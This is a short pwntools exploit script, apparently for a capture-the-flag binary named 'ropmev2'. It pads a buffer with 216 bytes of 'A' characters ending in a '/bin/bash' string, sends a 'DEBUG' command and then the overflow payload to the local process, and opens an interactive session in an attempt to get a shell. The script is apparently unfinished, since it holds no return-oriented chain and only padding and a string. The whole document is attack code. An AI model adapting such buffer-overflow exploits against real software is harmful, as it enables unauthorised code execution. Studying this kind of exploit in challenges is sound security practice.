from pwn import *

pload = b"\x00XXXXXXX" + b"/bin/bash\x00"
pload = b"A"*(216-len(pload)) + pload

r = process("./ropmev2")
#gdb.attach(r, aslr=0)
pause()
r.sendline("DEBUG")
print(r.recvline())
r.sendline(pload)
r.interactive()
